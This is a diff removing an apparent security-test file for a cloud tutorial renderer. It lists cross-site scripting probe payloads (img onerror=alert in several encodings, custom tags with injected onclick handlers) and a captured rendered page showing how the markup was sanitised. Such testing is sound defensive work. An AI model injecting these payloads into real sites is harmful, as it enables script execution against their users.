@@ -1,157 +1,230 @@
-#Header1 <img ng-template="xss" ng-click="xss" src=x1 onerror=alert(1)>
-1
-#Header2 \x3cimg src=x2 onerror=alert(2)\x3e
-1
-#Header3 \u003cimg src=x3 onerror=alert(3)\u003e
-1
-#Header3 &lt;img src=x3 onerror=alert(3)&gt;
 
-a
-<img src=x1 onerror=alert(1)>
-b
-\x3cimg src=x2 onerror=alert(2)\x3e
-c
-\u003cimg src=x3 onerror=alert(3)\u003e
-d
-&lt;img src=x3 onerror=alert(3)&gt;
-e
-<walkthrough-editor-spotlight spotlightId="menu-terminal-new-terminal">New Terminal</walkthrough-editor-spotlight>
-f
-<walkthrough-editor-spotlight xss=123 onclick=alert() spotlightId="menu-terminal-new-terminal">New Terminal 2</walkthrough-editor-spotlight>
-g
-<walkthrough-ICON_NAME data-xss></walkthrough-ICON_NAME>
-<walkthrough-cloud-shell-icon data-xss>aasd</walkthrough-cloud-shell-icon>
-<walkthrough-web-preview-icon data-xss>asd</walkthrough-web-preview-icon>
-<walkthrough-cloud-shell-editor-icon data-xss></walkthrough-cloud-shell-editor-icon>
-<walkthrough-nav-menu-icon data-xss></walkthrough-nav-menu-icon>
-<walkthrough-notification-menu-icon data-xss></walkthrough-notification-menu-icon>
-<walkthrough-pin-section-icon data-xss></walkthrough-pin-section-icon>
-h
-<walkthrough-tutorial-duration duration="DURATION"></walkthrough-tutorial-duration>
-h1
-<walkthrough-tutorial-duration duration="XSSDURATION"></walkthrough-tutorial-duration>
-h2
-<walkthrough-tutorial-duration duration="XSSDURATION<xss>\x3cxss\x3e\u003cxss\u003e&lt;xss&gt;"></walkthrough-tutorial-duration>
-h3
 
-    <base href="/tutorial/iframe-angular.html">
-    <meta charset="utf-8">
-    <meta name="referrer" content="no-referrer">
-    <title>Walkthrough</title>
-    <link href="https://fonts.googleapis.com/css?family=Google+Sans:400,500|Roboto:400,500,700|Roboto+Mono:400,500,700|Inconsolata:400,700" rel="stylesheet" type="text/css" nonce="">
-    <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Extended" rel="stylesheet" type="text/css" nonce="">
-    <link href="https://walkthroughs.googleusercontent.com/javascript/4jcv2xv5-t6uw-rled-5jfa-foy54z4zj2p3/style-angular.css" rel="stylesheet" type="text/css" nonce="">
-  <style type="text/css"></style><style>[_nghost-bkf-c80]{display:block}.router-outlet-container[_ngcontent-bkf-c80]{min-height:0}
-/**# sourceMappingURL=app.css.map */</style><style type="text/css">/**
-  @angular/flex-layout - workaround for possible browser quirk with mediaQuery listeners
-  see http://bit.ly/2sd4HMP
-*/
-@media (min-width: 600px), (max-width: 599px), (min-width: 960px), (max-width: 959px), (min-width: 1280px), (max-width: 1279px), (min-width: 1920px), (max-width: 1920px), (min-width: 0px) and (max-width: 599px), (min-width: 600px) and (max-width: 959px), (min-width: 960px) and (max-width: 1279px), (min-width: 1280px) and (max-width: 1919px), (min-width: 1920px) and (max-width: 5000px) {.fx-query-test{ }}</style><style>.mat-toolbar[_ngcontent-bkf-c79]{height:49px;min-height:49px;border-bottom:1px solid #dadce0}.mat-toolbar[_ngcontent-bkf-c79]   .mat-toolbar-row[_ngcontent-bkf-c79]{margin-top:4px;padding:0 8px}.mat-toolbar[_ngcontent-bkf-c79]   h1.gmat-headline-6[_ngcontent-bkf-c79]{font:normal normal 400 18px/24px "Google Sans",sans-serif;-webkit-font-smoothing:antialiased;text-overflow:ellipsis;overflow:hidden}.mat-icon-button[_ngcontent-bkf-c79]{height:40px;width:40px;line-height:40px}.mat-menu-item[_ngcontent-bkf-c79]{height:32px;line-height:32px;color:#3c4043}.mat-menu-item[_ngcontent-bkf-c79]   .mat-icon[_ngcontent-bkf-c79]{font-size:18px;height:18px;width:18px;line-height:18px}#walkthrough-header-back[_ngcontent-bkf-c79]{color:var(--icon-color);padding:0}#walkthrough-header-back[_ngcontent-bkf-c79]:hover{background:#fff}.history-opt-in-button[_ngcontent-bkf-c79]{padding-left:0;padding-right:0}.history-opt-in-button[_ngcontent-bkf-c79]   .mat-slide-toggle[_ngcontent-bkf-c79]{padding-right:10px;padding-left:10px;height:32px;line-height:32px;color:#3c4043}.walkthrough-header-back[_ngcontent-bkf-c79]{min-width:28px;min-height:28px}.walkthrough-home-icon[_ngcontent-bkf-c79]{margin:0 8px;min-width:24px;color:var(--icon-color)}.learn-assistant-header[_ngcontent-bkf-c79]{margin:0 4px;overflow:hidden}.learn-panel-header[_ngcontent-bkf-c79]{margin:0 8px}.walkthrough-category-title[_ngcontent-bkf-c79]{overflow:hidden;text-overflow:ellipsis}.walkthrough-report-problem-button[_ngcontent-bkf-c79]   mat-icon[_ngcontent-bkf-c79]{color:var(--icon-color);height:21px;width:21px}.learn-assistant-title[_ngcontent-bkf-c79]{font:normal normal 500 10px/16px "Roboto",sans-serif;letter-spacing:.3px;-webkit-font-smoothing:antialiased;text-transform:uppercase;color:var(--icon-color);line-height:10px}.walkthrough-report-problem-button[_ngcontent-bkf-c79]   mat-icon[_ngcontent-bkf-c79]{color:var(--icon-color);height:21px;width:21px}.walkthrough-menu-button[_ngcontent-bkf-c79]   mat-icon[_ngcontent-bkf-c79], .walkthrough-close-button[_ngcontent-bkf-c79]   mat-icon[_ngcontent-bkf-c79]{color:var(--icon-color)}</style><style>.supporting-illustration[_ngcontent-bkf-c32]{height:18px;width:18px;vertical-align:middle}.banner-container[_ngcontent-bkf-c32]{max-height:500px;overflow:hidden;position:relative}.banner-message[_ngcontent-bkf-c32]{padding:12px 16px}.gmat-body-2[_ngcontent-bkf-c32]{font-size:13px;line-height:16px}.banner-message-content[_ngcontent-bkf-c32]{overflow-x:auto;overflow-y:hidden}a[_ngcontent-bkf-c32]{display:block;font-weight:bold;padding-top:10px;text-decoration:underline}</style><style>button[_ngcontent-bkf-c33]{text-align:unset;width:100%;overflow:hidden;text-overflow:ellipsis;padding-top:8px}.mat-icon[_ngcontent-bkf-c33]{height:16px;width:16px;padding-bottom:8px;padding-right:5px}
-/**# sourceMappingURL=previous_button.css.map */</style><style>.cdk-high-contrast-active .mat-toolbar{outline:solid 1px}.mat-toolbar .mat-mdc-button-base.mat-unthemed{--mdc-text-button-label-text-color: inherit;--mdc-outlined-button-label-text-color: inherit}.mat-toolbar-row,.mat-toolbar-single-row{display:flex;box-sizing:border-box;padding:0 16px;width:100%;flex-direction:row;align-items:center;white-space:nowrap}.mat-toolbar-multiple-rows{display:flex;box-sizing:border-box;flex-direction:column;width:100%}
-</style><style>.mat-icon{-webkit-user-select:none;user-select:none;background-repeat:no-repeat;display:inline-block;fill:currentColor;height:24px;width:24px;overflow:hidden}.mat-icon.mat-icon-inline{font-size:inherit;height:inherit;line-height:inherit;width:inherit}.mat-icon.mat-ligature-font[fontIcon]::before{content:attr(fontIcon)}[dir=rtl] .mat-icon-rtl-mirror{transform:scale(-1, 1)}.mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-prefix .mat-icon,.mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-suffix .mat-icon{display:block}.mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-prefix .mat-icon-button .mat-icon,.mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-suffix .mat-icon-button .mat-icon{margin:auto}
-</style><style>.mat-button .mat-button-focus-overlay,.mat-icon-button .mat-button-focus-overlay{opacity:0}.mat-button:hover:not(.mat-button-disabled) .mat-button-focus-overlay,.mat-stroked-button:hover:not(.mat-button-disabled) .mat-button-focus-overlay{opacity:.04}@media(hover: none){.mat-button:hover:not(.mat-button-disabled) .mat-button-focus-overlay,.mat-stroked-button:hover:not(.mat-button-disabled) .mat-button-focus-overlay{opacity:0}}.mat-button,.mat-icon-button,.mat-stroked-button,.mat-flat-button{box-sizing:border-box;position:relative;-webkit-user-select:none;user-select:none;cursor:pointer;outline:none;border:none;-webkit-tap-highlight-color:rgba(0,0,0,0);display:inline-block;white-space:nowrap;text-decoration:none;vertical-align:baseline;text-align:center;margin:0;min-width:64px;line-height:36px;padding:0 16px;border-radius:4px;overflow:visible}.mat-button::-moz-focus-inner,.mat-icon-button::-moz-focus-inner,.mat-stroked-button::-moz-focus-inner,.mat-flat-button::-moz-focus-inner{border:0}.mat-button.mat-button-disabled,.mat-icon-button.mat-button-disabled,.mat-stroked-button.mat-button-disabled,.mat-flat-button.mat-button-disabled{cursor:default}.mat-button.cdk-keyboard-focused .mat-button-focus-overlay,.mat-button.cdk-program-focused .mat-button-focus-overlay,.mat-icon-button.cdk-keyboard-focused .mat-button-focus-overlay,.mat-icon-button.cdk-program-focused .mat-button-focus-overlay,.mat-stroked-button.cdk-keyboard-focused .mat-button-focus-overlay,.mat-stroked-button.cdk-program-focused .mat-button-focus-overlay,.mat-flat-button.cdk-keyboard-focused .mat-button-focus-overlay,.mat-flat-button.cdk-program-focused .mat-button-focus-overlay{opacity:.12}.mat-button::-moz-focus-inner,.mat-icon-button::-moz-focus-inner,.mat-stroked-button::-moz-focus-inner,.mat-flat-button::-moz-focus-inner{border:0}.mat-raised-button{box-sizing:border-box;position:relative;-webkit-user-select:none;user-select:none;cursor:pointer;outline:none;border:none;-webkit-tap-highlight-color:rgba(0,0,0,0);display:inline-block;white-space:nowrap;text-decoration:none;vertical-align:baseline;text-align:center;margin:0;min-width:64px;line-height:36px;padding:0 16px;border-radius:4px;overflow:visible;transform:translate3d(0, 0, 0);transition:background 400ms cubic-bezier(0.25, 0.8, 0.25, 1),box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1)}.mat-raised-button::-moz-focus-inner{border:0}.mat-raised-button.mat-button-disabled{cursor:default}.mat-raised-button.cdk-keyboard-focused .mat-button-focus-overlay,.mat-raised-button.cdk-program-focused .mat-button-focus-overlay{opacity:.12}.mat-raised-button::-moz-focus-inner{border:0}.mat-raised-button._mat-animation-noopable{transition:none !important;animation:none !important}.mat-stroked-button{border:1px solid currentColor;padding:0 15px;line-height:34px}.mat-stroked-button .mat-button-ripple.mat-ripple,.mat-stroked-button .mat-button-focus-overlay{top:-1px;left:-1px;right:-1px;bottom:-1px}.mat-fab{box-sizing:border-box;position:relative;-webkit-user-select:none;user-select:none;cursor:pointer;outline:none;border:none;-webkit-tap-highlight-color:rgba(0,0,0,0);display:inline-block;white-space:nowrap;text-decoration:none;vertical-align:baseline;text-align:center;margin:0;min-width:64px;line-height:36px;padding:0 16px;border-radius:4px;overflow:visible;transform:translate3d(0, 0, 0);transition:background 400ms cubic-bezier(0.25, 0.8, 0.25, 1),box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1);min-width:0;border-radius:50%;width:56px;height:56px;padding:0;flex-shrink:0}.mat-fab::-moz-focus-inner{border:0}.mat-fab.mat-button-disabled{cursor:default}.mat-fab.cdk-keyboard-focused .mat-button-focus-overlay,.mat-fab.cdk-program-focused .mat-button-focus-overlay{opacity:.12}.mat-fab::-moz-focus-inner{border:0}.mat-fab._mat-animation-noopable{transition:none !important;animation:none !important}.mat-fab .mat-button-wrapper{padding:16px 0;display:inline-block;line-height:24px}.mat-mini-fab{box-sizing:border-box;position:relative;-webkit-user-select:none;user-select:none;cursor:pointer;outline:none;border:none;-webkit-tap-highlight-color:rgba(0,0,0,0);display:inline-block;white-space:nowrap;text-decoration:none;vertical-align:baseline;text-align:center;margin:0;min-width:64px;line-height:36px;padding:0 16px;border-radius:4px;overflow:visible;transform:translate3d(0, 0, 0);transition:background 400ms cubic-bezier(0.25, 0.8, 0.25, 1),box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1);min-width:0;border-radius:50%;width:40px;height:40px;padding:0;flex-shrink:0}.mat-mini-fab::-moz-focus-inner{border:0}.mat-mini-fab.mat-button-disabled{cursor:default}.mat-mini-fab.cdk-keyboard-focused .mat-button-focus-overlay,.mat-mini-fab.cdk-program-focused .mat-button-focus-overlay{opacity:.12}.mat-mini-fab::-moz-focus-inner{border:0}.mat-mini-fab._mat-animation-noopable{transition:none !important;animation:none !important}.mat-mini-fab .mat-button-wrapper{padding:8px 0;display:inline-block;line-height:24px}.mat-icon-button{padding:0;min-width:0;width:40px;height:40px;flex-shrink:0;line-height:40px;border-radius:50%}.mat-icon-button i,.mat-icon-button .mat-icon{line-height:24px}.mat-button-ripple.mat-ripple,.mat-button-focus-overlay{top:0;left:0;right:0;bottom:0;position:absolute;pointer-events:none;border-radius:inherit}.mat-button-ripple.mat-ripple:not(:empty){transform:translateZ(0)}.mat-button-focus-overlay{opacity:0;transition:opacity 200ms cubic-bezier(0.35, 0, 0.25, 1),background-color 200ms cubic-bezier(0.35, 0, 0.25, 1)}._mat-animation-noopable .mat-button-focus-overlay{transition:none}.mat-button-ripple-round{border-radius:50%;z-index:1}.mat-button .mat-button-wrapper>*,.mat-flat-button .mat-button-wrapper>*,.mat-stroked-button .mat-button-wrapper>*,.mat-raised-button .mat-button-wrapper>*,.mat-icon-button .mat-button-wrapper>*,.mat-fab .mat-button-wrapper>*,.mat-mini-fab .mat-button-wrapper>*{vertical-align:middle}.mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-prefix .mat-icon-button,.mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-suffix .mat-icon-button{display:inline-flex;justify-content:center;align-items:center;font-size:inherit;width:2.5em;height:2.5em}.mat-flat-button::before,.mat-raised-button::before,.mat-fab::before,.mat-mini-fab::before{margin:calc(calc(var(--mat-focus-indicator-border-width, 3px) + 2px) * -1)}.mat-stroked-button::before{margin:calc(calc(var(--mat-focus-indicator-border-width, 3px) + 3px) * -1)}.cdk-high-contrast-active .mat-button,.cdk-high-contrast-active .mat-flat-button,.cdk-high-contrast-active .mat-raised-button,.cdk-high-contrast-active .mat-icon-button,.cdk-high-contrast-active .mat-fab,.cdk-high-contrast-active .mat-mini-fab{outline:solid 1px}.mat-datepicker-toggle .mat-mdc-button-base{width:40px;height:40px;padding:8px 0}.mat-datepicker-actions .mat-button-base+.mat-button-base{margin-left:8px}[dir=rtl] .mat-datepicker-actions .mat-button-base+.mat-button-base{margin-left:0;margin-right:8px}
-</style><style>mat-menu{display:none}.mat-menu-panel{min-width:112px;max-width:280px;overflow:auto;-webkit-overflow-scrolling:touch;max-height:calc(100vh - 48px);border-radius:4px;outline:0;min-height:64px;position:relative}.mat-menu-panel.ng-animating{pointer-events:none}.cdk-high-contrast-active .mat-menu-panel{outline:solid 1px}.mat-menu-content:not(:empty){padding-top:8px;padding-bottom:8px}.mat-menu-item{-webkit-user-select:none;user-select:none;cursor:pointer;outline:none;border:none;-webkit-tap-highlight-color:rgba(0,0,0,0);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;display:block;line-height:48px;height:48px;padding:0 16px;text-align:left;text-decoration:none;max-width:100%;position:relative}.mat-menu-item::-moz-focus-inner{border:0}.mat-menu-item[disabled]{cursor:default}[dir=rtl] .mat-menu-item{text-align:right}.mat-menu-item .mat-icon{margin-right:16px;vertical-align:middle}.mat-menu-item .mat-icon svg{vertical-align:top}[dir=rtl] .mat-menu-item .mat-icon{margin-left:16px;margin-right:0}.mat-menu-item[disabled]::after{display:block;position:absolute;content:"";top:0;left:0;bottom:0;right:0}.cdk-high-contrast-active .mat-menu-item{margin-top:1px}.mat-menu-item-submenu-trigger{padding-right:32px}[dir=rtl] .mat-menu-item-submenu-trigger{padding-right:16px;padding-left:32px}.mat-menu-submenu-icon{position:absolute;top:50%;right:16px;transform:translateY(-50%);width:5px;height:10px;fill:currentColor}[dir=rtl] .mat-menu-submenu-icon{right:auto;left:16px;transform:translateY(-50%) scaleX(-1)}.cdk-high-contrast-active .mat-menu-submenu-icon{fill:CanvasText}button.mat-menu-item{width:100%}.mat-menu-item .mat-menu-ripple{top:0;left:0;right:0;bottom:0;position:absolute;pointer-events:none}
-</style><style>[_nghost-bkf-c142]{flex:1 1 100%;display:flex;flex-direction:column;place-content:stretch flex-start;align-items:stretch;min-height:0}shadow-boxer.floating-footer[_ngcontent-bkf-c142]{flex:0 1 auto}.content-container[_ngcontent-bkf-c142]{overflow:auto}.content-container[_ngcontent-bkf-c142], .walkthrough-title[_ngcontent-bkf-c142]{padding:0px 16px}.red-icon[_ngcontent-bkf-c142]{color:#da4236;height:18px;width:18px;vertical-align:middle}[_nghost-bkf-c142]     table{border-collapse:collapse;margin:8px}[_nghost-bkf-c142]     table th, [_nghost-bkf-c142]     table td{border:1px solid #000}.mat-expansion-panel[_ngcontent-bkf-c142]{margin-bottom:4px}.mat-expansion-panel-header-title[_ngcontent-bkf-c142]{font-family:"Roboto",sans-serif}
-/**# sourceMappingURL=content_renderer.css.map */</style><style>.progress-container[_ngcontent-bkf-c140]{display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-flow:wrap;-moz-box-orient:vertical;-moz-box-direction:normal;-ms-flex-flow:wrap;flex-flow:wrap;-webkit-box-pack:center;-webkit-justify-content:center;-moz-box-pack:center;-ms-flex-pack:center;justify-content:center;list-style:none;padding:0;padding-top:5px;margin:0}.progress-bar[_ngcontent-bkf-c140]{display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-flow:wrap;-moz-box-orient:vertical;-moz-box-direction:normal;-ms-flex-flow:wrap;flex-flow:wrap;-webkit-box-pack:center;-webkit-justify-content:center;-moz-box-pack:center;-ms-flex-pack:center;justify-content:center;padding:0;margin:5px 0;-webkit-box-flex:1;-webkit-flex-grow:1;-moz-box-flex:1;-ms-flex-positive:1;flex-grow:1;-webkit-transition:all .3s ease-in-out;transition:all .3s ease-in-out}.expansion-journey-list[_ngcontent-bkf-c140]{margin:15px 0}.mat-expansion-panel[_ngcontent-bkf-c140]{background:#f1f3f4}.expansion-panel-header[_ngcontent-bkf-c140]{-webkit-flex-flow:wrap;-ms-flex-flow:wrap;flex-flow:wrap}.journey-walkthrough-title-intro[_ngcontent-bkf-c140]{padding:5px 0}.mat-divider[_ngcontent-bkf-c140]{padding-bottom:10px}mat-panel-title[_ngcontent-bkf-c140]{-webkit-box-flex:4;-webkit-flex-grow:4;-moz-box-flex:4;-ms-flex-positive:4;flex-grow:4}mat-panel-description[_ngcontent-bkf-c140]{-webkit-box-pack:end;-webkit-justify-content:flex-end;-moz-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;min-width:35px;-webkit-box-flex:1;-webkit-flex-grow:1;-moz-box-flex:1;-ms-flex-positive:1;flex-grow:1}mat-nav-list[_ngcontent-bkf-c140]   mat-list-item[_ngcontent-bkf-c140]{height:25px;font-size:13px;padding-right:20px;padding-left:25px;width:300px;margin-left:-25px}mat-nav-list[_ngcontent-bkf-c140]   mat-list-item[_ngcontent-bkf-c140]:hover{background:#d3d3d3;cursor:pointer}
-/**# sourceMappingURL=progress_bar.css.map */</style><style>.step-counter[_ngcontent-bkf-c141]{padding:12px 12px 0px;opacity:.66;font-size:12px}</style><style>[_nghost-bkf-c84]{position:relative;max-height:100%;min-height:0;width:100%;display:block}.shadow-overlay[_ngcontent-bkf-c84]{overflow-y:auto;position:absolute;height:100%;width:100%;pointer-events:none}.shadow-overlay[_ngcontent-bkf-c84]:not(.not-at-top):not(.not-at-bottom){display:none}.shadow-overlay.not-at-top[_ngcontent-bkf-c84]::before{content:"";position:absolute;top:0;width:100%;height:6px;background:radial-gradient(ellipse at 50% 0%, rgba(0, 0, 0, 0.15), rgba(60, 64, 67, 0) 75%);z-index:1}.shadow-overlay.not-at-bottom[_ngcontent-bkf-c84]::after{content:"";pointer-events:none;position:absolute;bottom:0;width:100%;height:6px;background:radial-gradient(ellipse at 50% 100%, rgba(0, 0, 0, 0.15), rgba(60, 64, 67, 0) 75%);z-index:1}.shadow-box-content[_ngcontent-bkf-c84]{overflow-y:auto;max-height:100%;width:100%}</style><style>.walkthrough-footer-button.mat-button[_ngcontent-bkf-c119], .walkthrough-footer-button.mat-flat-button[_ngcontent-bkf-c119]{line-height:24px;padding:0 12px;min-width:48px}mat-toolbar[_ngcontent-bkf-c119]{min-height:48px;height:48px}mat-toolbar[_ngcontent-bkf-c119]   button[_ngcontent-bkf-c119]{text-transform:uppercase;font-size:12px}</style><style>[_nghost-bkf-c118]{display:none}.show[_nghost-bkf-c118]{display:block}  .journey header h1{height:0;margin:0;overflow:hidden;padding:0}
-/**# sourceMappingURL=html_step.css.map */</style><style>.spotlight-link[_ngcontent-bkf-c63]{line-height:25px;padding:3px;border:1px dashed var(--purple-400);border-radius:5px;color:var(--purple-900);white-space:nowrap}.spotlight-link[_ngcontent-bkf-c63]     strong{font-weight:normal}.spotlight-link[_ngcontent-bkf-c63]:hover{cursor:pointer;background:var(--purple-50)}  .dark-mode .spotlight-link{border:1px dashed var(--purple-300);color:var(--purple-200)}  .dark-mode .spotlight-link:hover{background:var(--purple-900)}.spotlight-button[_ngcontent-bkf-c63]{box-sizing:content-box;display:inline-block;height:24px;margin:8px;min-width:72px;padding:4px 16px;text-align:center;text-transform:uppercase;-webkit-border-radius:0px}.spotlight-diagnostic[_ngcontent-bkf-c63]{transform:scale(0.6);vertical-align:middle;margin-bottom:3px}.match[_ngcontent-bkf-c63]{color:green}.no-match[_ngcontent-bkf-c63]{color:red}.not-present[_ngcontent-bkf-c63]{color:gray}  .mat-tooltip.spotlight-diagnostic-tooltip{font-size:12px;white-space:pre-line}</style><style>button.mat-icon-button-inline.mat-icon-button[_ngcontent-bkf-c92]{vertical-align:middle;margin-bottom:4px;line-height:inherit;height:24px;width:24px;color:#1967d2}img.block-icon[_ngcontent-bkf-c92]{display:block;margin:25px auto;width:100px;height:auto}</style><style>.walkthrough-duration[_ngcontent-bkf-c115]{margin-bottom:12px}.walkthrough-duration-icon[_ngcontent-bkf-c115]{vertical-align:middle;display:inline-block;height:18px;width:18px}.walkthrough-duration-label[_ngcontent-bkf-c115]{display:inline;vertical-align:middle;margin-left:4px}</style><style>[_nghost-bkf-c91]{display:block;margin-bottom:8px}[_nghost-bkf-c91]   .code-block-button-container[_ngcontent-bkf-c91]{display:flex;justify-content:flex-end;margin-right:-4px;position:relative;z-index:5}[_nghost-bkf-c91]   .code-block-copy[_ngcontent-bkf-c91]   .cfc-button-small[_ngcontent-bkf-c91]{height:24px;width:24px;line-height:24px}[_nghost-bkf-c91]   .code-block-copy[_ngcontent-bkf-c91]   .cfc-button-small[_ngcontent-bkf-c91]::before{border-radius:4px}[_nghost-bkf-c91]   .code-block-copy[_ngcontent-bkf-c91]   mat-icon[_ngcontent-bkf-c91]{fill:var(--icon-color);height:18px;width:18px}[_nghost-bkf-c91]   .code-block[_ngcontent-bkf-c91]{color:#000;font-family:roboto mono;font-size:11px;line-height:20px;background-color:#f8f9fa;padding:8px 8px 0;position:relative;overflow-y:hidden}[_nghost-bkf-c91]   .code-block[_ngcontent-bkf-c91]   .code-block-content[_ngcontent-bkf-c91]{white-space:pre}[_nghost-bkf-c91]   .code-block.terminal-input[_ngcontent-bkf-c91]   .code-block-content[_ngcontent-bkf-c91]::before{content:"$ ";color:#9aa0a6}[_nghost-bkf-c91]   .code-block-content.terminal[_ngcontent-bkf-c91]   var[_ngcontent-bkf-c91]{color:#ec407a;font-weight:700}.code-block-content-container[_ngcontent-bkf-c91]{overflow-x:auto;overflow-y:hidden;padding-bottom:10px;min-height:20px}</style></head>
-  <body>
-    <app-root id="walkthrough-content" _nghost-bkf-c80="" ng-version="0.0.0-PLACEHOLDER" style="display: flex; box-sizing: border-box; flex-direction: row;"><div _ngcontent-bkf-c80="" fxlayout="column" fxlayoutalign="space-between stretch" fxflex="grow" style="box-sizing: border-box; display: flex; flex-direction: column; max-width: 100%; place-content: stretch space-between; align-items: stretch; flex: 1 1 100%;"><walkthrough-toolbar _ngcontent-bkf-c80="" _nghost-bkf-c79=""><mat-toolbar _ngcontent-bkf-c79="" class="mat-toolbar mat-toolbar-multiple-rows"><mat-toolbar-row _ngcontent-bkf-c79="" fxlayout="row" fxlayoutalign="end center" class="mat-toolbar-row" style="box-sizing: border-box; max-height: 100%; display: flex; flex-direction: row; place-content: center flex-end; align-items: center;"><mat-icon _ngcontent-bkf-c79="" role="img" class="mat-icon notranslate walkthrough-home-icon mat-icon-no-color" aria-hidden="true" data-mat-icon-type="svg" data-mat-icon-name="school-gm2"><svg width="100%" height="100%" viewBox="0 0 24 24" fit="" preserveAspectRatio="xMidYMid meet" focusable="false">
-      <path d="M0 0h24v24H0z" fill="none"></path>
-      <path d="M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82zM12 3L1 9l11 6 9-4.91V17h2V9L12 3z"></path>
-    </svg></mat-icon><div _ngcontent-bkf-c79="" fxflex="grow" role="none" fxlayout="column" class="learn-assistant-header" style="flex: 1 1 100%; box-sizing: border-box; display: flex; flex-direction: column;"><div _ngcontent-bkf-c79="" fxflex="grow" role="none" class="gmat-overline learn-assistant-title title-secondary gmat-meta" style="flex: 1 1 100%; box-sizing: border-box;">Learn</div><div _ngcontent-bkf-c79="" fxflex="grow" role="none" class="gmat-subhead-2 walkthrough-view-title learn-assistant-subtitle" style="flex: 1 1 100%; box-sizing: border-box;">Tutorial</div></div><!----><button _ngcontent-bkf-c79="" id="walkthrough-menu-button" mat-icon-button="" fxflex="none" mattooltip="More options" mattooltipclass="toolbar-tooltip" aria-label="More options" class="mat-focus-indicator mat-menu-trigger mat-tooltip-trigger walkthrough-menu-button mat-icon-button mat-button-base ng-star-inserted" aria-haspopup="menu" aria-expanded="false" style="flex: 0 0 auto; box-sizing: border-box; max-width: none;"><span class="mat-button-wrapper"><mat-icon _ngcontent-bkf-c79="" role="img" svgicon="status-info-small-clear" class="mat-icon notranslate mat-icon-no-color" aria-hidden="true" data-mat-icon-type="svg" data-mat-icon-name="status-info-small-clear"><svg id="pantheon-status-info-small-clear" width="100%" height="100%" viewBox="0 0 18 18" fit="" preserveAspectRatio="xMidYMid meet" focusable="false">
-  <path d="M9 16A7 7 0 1 1 9 2a7 7 0 0 1 0 14zm0-1.7A5.3 5.3 0 1 0 9 3.7a5.3 5.3 0 0 0 0 10.6zM8 7V5h2v2H8zm0 6V8h2v5H8z" fill-rule="evenodd"></path>
-</svg></mat-icon></span><span matripple="" class="mat-ripple mat-button-ripple mat-button-ripple-round"></span><span class="mat-button-focus-overlay"></span></button><!----><!----><button _ngcontent-bkf-c79="" id="walkthrough-close-button" mat-icon-button="" fxflex="none" mattooltip="Close panel" mattooltipclass="toolbar-tooltip" aria-label="Close panel" cdkfocusinitial="" class="mat-focus-indicator mat-tooltip-trigger walkthrough-close-button mat-icon-button mat-button-base" style="flex: 0 0 auto; box-sizing: border-box; max-width: none;"><span class="mat-button-wrapper"><mat-icon _ngcontent-bkf-c79="" role="img" svgicon="pantheon-close" class="mat-icon notranslate mat-icon-no-color" aria-hidden="true" data-mat-icon-type="svg" data-mat-icon-name="pantheon-close"><svg width="100%" height="100%" viewBox="0 0 24 24" fit="" preserveAspectRatio="xMidYMid meet" focusable="false">
-      <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59
-               19 19 17.59 13.41 12z" fill-rule="evenodd">
-      </path>
-    </svg></mat-icon></span><span matripple="" class="mat-ripple mat-button-ripple mat-button-ripple-round"></span><span class="mat-button-focus-overlay"></span></button><!----></mat-toolbar-row></mat-toolbar><mat-menu _ngcontent-bkf-c79="" class=""><!----></mat-menu></walkthrough-toolbar><walkthrough-banner _ngcontent-bkf-c80="" _nghost-bkf-c32="" class="ng-tns-c32-0"><!----><!----><!----></walkthrough-banner><walkthrough-previous-button _ngcontent-bkf-c80="" _nghost-bkf-c33=""><!----></walkthrough-previous-button><div _ngcontent-bkf-c80="" fxlayout="column" fxlayoutalign="start stretch" fxflex="grow" class="router-outlet-container" style="box-sizing: border-box; flex: 1 1 100%; display: flex; flex-direction: column; place-content: stretch flex-start; align-items: stretch;"><router-outlet _ngcontent-bkf-c80=""></router-outlet><content-renderer _nghost-bkf-c142="" class="ng-star-inserted"><progress-bar _ngcontent-bkf-c142="" _nghost-bkf-c140=""><!----><!----></progress-bar><step-counter _ngcontent-bkf-c142="" _nghost-bkf-c141=""><!----></step-counter><shadow-boxer _ngcontent-bkf-c142="" class="floating-footer ng-tns-c84-2 ng-star-inserted" _nghost-bkf-c84=""><div _ngcontent-bkf-c84="" class="shadow-overlay ng-tns-c84-2 not-at-bottom"></div><div _ngcontent-bkf-c84="" cdkscrollable="" class="shadow-box-content ng-tns-c84-2 ng-trigger ng-trigger-animationEvent"><div _ngcontent-bkf-c142="" id="walkthrough-step-container" role="region" class="content-container ng-tns-c84-2"><walkthrough-html-step _ngcontent-bkf-c142="" class="walkthrough-step show ng-star-inserted" _nghost-bkf-c118="" id="step_1" style=""><p>#Header1 <img>
-##Header2 \x3cimg src=x2 onerror=alert(2)\x3e
-##Header3 \u003cimg src=x3 onerror=alert(3)\u003e
-##Header3 &lt;img src=x3 onerror=alert(3)&gt;</p>
-<p>a
-<img>
-b
-\x3cimg src=x2 onerror=alert(2)\x3e
-c
-\u003cimg src=x3 onerror=alert(3)\u003e
-d
-&lt;img src=x3 onerror=alert(3)&gt;
-e
-<walkthrough-editor-spotlight spotlightid="menu-terminal-new-terminal" ng-version="0.0.0-PLACEHOLDER"><spotlight-base _nghost-bkf-c63=""><a _ngcontent-bkf-c63="" dismissbanners="" role="button" aria-label="open spotlight" class="spotlight-link">New Terminal</a></spotlight-base></walkthrough-editor-spotlight>
-f
